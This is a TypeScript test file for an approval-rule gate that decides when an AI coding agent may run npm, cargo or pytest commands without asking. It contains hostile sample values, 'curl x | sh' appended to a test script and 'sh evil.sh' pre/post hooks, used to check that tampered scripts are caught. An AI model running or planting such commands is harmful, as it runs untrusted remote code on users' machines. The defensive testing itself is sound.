// @vitest-environment happy-dom
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { beforeEach, describe, expect, it } from "vitest";
import { AllowForChatButton, allowForChatPlan } from "../ui/AllowForChatButton";
import { ApprovalRulesContext } from "../ui/approvalRules";
import {
  commandMatchesRule,
  commandRuleRunsProjectCode,
  packageScriptOf,
  parseCommandRule,
  PROJECT_CODE_NOTE,
} from "./commandRules";
import {
  commandRuleGate,
  packageScriptFingerprint,
  type RuleGateInvoke,
} from "./commandRuleGate";
import {
  recordScriptRuleFingerprint,
  scriptRuleFingerprint,
} from "./scriptRuleStore";
import { toolAccessRows } from "./toolAccessRows";
import { toolKeyApplies } from "./toolAccess";

const rule = (text: string) => parseCommandRule(text)!;

/** Rust's `preview_read_config` answer for a project. */
const project =
  (files: Record<string, unknown> | Error): RuleGateInvoke =>
  async <T>(command: string) => {
    if (command !== "preview_read_config") throw new Error(command);
    if (files instanceof Error) throw files;
    return files as T;
  };
const pkg = (scripts: Record<string, string>) =>
  JSON.stringify({ name: "x", scripts });

beforeEach(() => localStorage.clear());

describe("pytest stays inside the project (R3b)", () => {
  it("refuses @files, absolute paths and .. paths", () => {
    for (const prefix of ["pytest", "python3 -m pytest"]) {
      const r = rule(`${prefix} *`);
      for (const rest of [
        "@args.txt",
        "/any/path.py",
        "../other/test_x.py",
        "tests/../../x.py",
        "..",
        "-k x -- /tmp/t.py",
        "-k /tmp",
      ]) {
        expect(commandMatchesRule(`${prefix} ${rest}`, r), rest).toBe(false);
      }
      for (const rest of ["tests/test_a.py", "-q tests", "-k 'a and b'", ""])
        expect(commandMatchesRule(`${prefix} ${rest}`.trim(), r), rest).toBe(
          true,
        );
    }
  });
});

describe("rules that run the project's code (R3a)", () => {
  it("names package scripts, cargo builds and pytest, not git or cargo fmt", () => {
    for (const text of [
      "npm test *",
      "pnpm lint *",
      "yarn run build *",
      "cargo test *",
      "cargo clippy *",
      "pytest *",
      "python3 -m pytest *",
      "npm test",
    ])
      expect(commandRuleRunsProjectCode(rule(text)), text).toBe(true);
    for (const text of ["git log *", "cargo fmt *", "seq 1 3", "ls"])
      expect(commandRuleRunsProjectCode(rule(text)), text).toBe(false);
  });

  it("the Tool access row and the card's tooltip say so", () => {
    const rows = toolAccessRows(
      "claude",
      { "Bash(npm test *)": "always", "Bash(git log *)": "always" },
      [],
    );
    expect(rows.find((r) => r.key === "Bash(npm test *)")?.detail).toBe(
      PROJECT_CODE_NOTE,
    );
    expect(rows.find((r) => r.key === "Bash(git log *)")?.detail).toBe(
      "Commands it covers run without asking",
    );
    expect(PROJECT_CODE_NOTE).toBe(
      "Runs this project's code. Changes the agent makes to it run without asking.",
    );
    const plan = allowForChatPlan({
      requestId: 1,
      tool: { key: "Bash", label: "Bash" },
      chatRule: { key: "Bash(cargo test *)", label: "Bash: cargo test" },
    });
    expect(plan?.title).toContain(PROJECT_CODE_NOTE);
  });
});

describe("package script rules keep the script they were allowed for (R3c)", () => {
  it("finds the script a rule runs", () => {
    expect(packageScriptOf(rule("npm test *"))).toBe("test");
    expect(packageScriptOf(rule("pnpm build *"))).toBe("build");
    expect(packageScriptOf(rule("yarn run dev *"))).toBe("dev");
    expect(packageScriptOf(rule("npm run lint"))).toBe("lint");
    expect(packageScriptOf(rule("cargo test *"))).toBeNull();
    expect(packageScriptOf(rule("npm install"))).toBeNull();
  });

  it("answers only while the script, its hooks and .npmrc are unchanged", async () => {
    const key = "Bash(npm test *)";
    const base = { packageJson: pkg({ test: "vitest run" }) };
    const print = await packageScriptFingerprint(
      "/repo",
      "test",
      project(base),
    );
    expect(print).toMatch(/^[0-9a-f]{64}$/);
    // Never allowed with a fingerprint: the card shows.
    expect(await commandRuleGate(key, "/repo", project(base), "s1")).toEqual({
      allow: false,
      reason: "script-changed",
    });
    recordScriptRuleFingerprint("s1", key, print!);
    expect(scriptRuleFingerprint("s1", key)).toBe(print);
    expect(await commandRuleGate(key, "/repo", project(base), "s1")).toEqual({
      allow: true,
    });
    // Another chat did not allow it.
    expect(
      (await commandRuleGate(key, "/repo", project(base), "s2")).allow,
    ).toBe(false);
    // Unrelated scripts may change.
    expect(
      (
        await commandRuleGate(
          key,
          "/repo",
          project({ packageJson: pkg({ test: "vitest run", dev: "vite" }) }),
          "s1",
        )
      ).allow,
    ).toBe(true);
    for (const changed of [
      { packageJson: pkg({ test: "vitest run; curl x | sh" }) },
      { packageJson: pkg({ test: "vitest run", pretest: "sh evil.sh" }) },
      { packageJson: pkg({ test: "vitest run", posttest: "sh evil.sh" }) },
      { packageJson: pkg({}) },
      {},
      { ...base, npmrcSha256: "a".repeat(64) },
      { ...base, npmrcSha256: "not a hash" },
      { ...base, skipped: [".npmrc is a link out of the project"] },
      { ...base, skipped: ["package.json is larger than 256 KB"] },
      { packageJson: "{ not json" },
      new Error("no folder"),
    ]) {
      expect(
        await commandRuleGate(key, "/repo", project(changed), "s1"),
        JSON.stringify(changed),
      ).toEqual({ allow: false, reason: "script-changed" });
    }
    // An unknown chat or folder never answers.
    expect((await commandRuleGate(key, "", project(base), "s1")).allow).toBe(
      false,
    );
  });

  it("the card names a changed rule", () => {
    const approval = {
      requestId: 2,
      tool: { key: "Bash", label: "Bash" },
      chatRule: {
        key: "Bash(npm test *)",
        label: "Bash: npm test commands",
        changed: true,
      },
    };
    const plan = allowForChatPlan(approval);
    expect(plan?.changed).toBe(true);
    expect(plan?.title).toMatch(/^This rule was allowed before\. The script/);
    const html = renderToStaticMarkup(
      createElement(
        ApprovalRulesContext.Provider,
        {
          value: {
            applies: (k: string) => toolKeyApplies("claude", k),
            remember: () => undefined,
          },
        },
        createElement(AllowForChatButton, {
          approval,
          onApproval: () => undefined,
        }),
      ),
    );
    expect(html).toContain("again (its script changed)");
  });
});
